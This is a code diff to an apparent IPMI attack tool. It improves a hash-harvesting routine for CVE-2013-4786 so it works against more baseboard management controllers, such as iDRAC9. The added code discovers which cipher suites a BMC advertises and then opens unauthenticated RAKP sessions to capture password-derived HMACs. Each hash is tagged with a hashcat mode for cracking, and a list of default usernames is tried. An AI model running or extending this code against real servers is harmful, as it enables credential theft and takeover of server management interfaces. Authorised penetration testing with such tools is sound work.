@@ -877,6 +877,29 @@ class Session:
         "user", "User", "user1", "USERID", "ydview", "yfadmin", "zabbix",
     ]
 
+    @classmethod
+    def _rakp_ladder(cls, offered: set[int]) -> list[tuple]:
+        """RAKP-hash probe ladder restricted to auth algos the BMC ADVERTISES.
+
+        For each crackable auth algo (MD5/SHA1/SHA256) present in `offered`, open
+        the session with an actually-offered suite that uses it — the RAKP2 auth
+        code depends only on the auth algo, not on integrity/confidentiality, so
+        a full suite (e.g. 3 = SHA1+AES) harvests the same HMAC-SHA1 hash as the
+        bare suite 1. Skips algos the BMC never offers, so no more blind
+        "no matching cipher suite" rejects. Empty `offered` (reachable but no
+        parseable records) → the full hardcoded ladder as a last-resort blind try."""
+        if not offered:
+            return list(cls._RAKP_HASH_ALGOS)
+        ladder = []
+        for auth_alg, name, dflt, hc_mode, hex_salt, salt_first in cls._RAKP_HASH_ALGOS:
+            cands = [s for s in offered
+                     if s in CIPHER_SUITES and CIPHER_SUITES[s].auth_alg == auth_alg]
+            if not cands:
+                continue
+            suite = dflt if dflt in cands else sorted(cands)[0]
+            ladder.append((auth_alg, name, suite, hc_mode, hex_salt, salt_first))
+        return ladder
+
     def grab_rakp_hashes(self, users: list[str] | None = None,
                          pad_username: bool = False) -> dict:
         """CVE-2013-4786: capture password-keyed RAKP2 HMACs without auth.
@@ -897,13 +920,23 @@ class Session:
         spend exactly one handshake per remaining user."""
         users = list(users) if users is not None else [self.username]
         role = 0x10 | (self.priv & 0x0F)       # name-only-lookup + max priv
+        # Discover the BMC's advertised cipher suites FIRST, then probe only the
+        # auth algos it actually offers. Blindly opening sessions for bare suites
+        # 6/1/17 draws "no matching cipher suite" on BMCs that offer only full
+        # suites (iDRAC9 offers 3 & 17, not 6/1). _query_cipher_suites raises on
+        # an unreachable BMC → we abort rather than blind-try a dead host.
+        full_ladder = self._rakp_ladder(self._query_cipher_suites())
+        if not full_ladder:
+            return {"host": self.host, "users": users, "hashes": [], "attempts": [
+                {"user": None, "alg": None, "ok": False,
+                 "error": "BMC advertises no crackable RAKP auth algo (MD5/SHA1/SHA256)"}]}
         results, attempts, locked = [], [], None
         for user in users:
             uname = user.encode("utf-8")
             if pad_username:                   # iDRAC-quirk targets only
                 uname = uname.ljust(16, b"\x00")
-            ladder = ([m for m in self._RAKP_HASH_ALGOS if m[2] == locked]
-                      if locked is not None else self._RAKP_HASH_ALGOS)
+            ladder = ([m for m in full_ladder if m[2] == locked]
+                      if locked is not None else full_ladder)
             for auth_alg, name, suite, hc_mode, hex_salt, salt_first in ladder:
                 try:
                     open_state = self._rakp_open(suite)
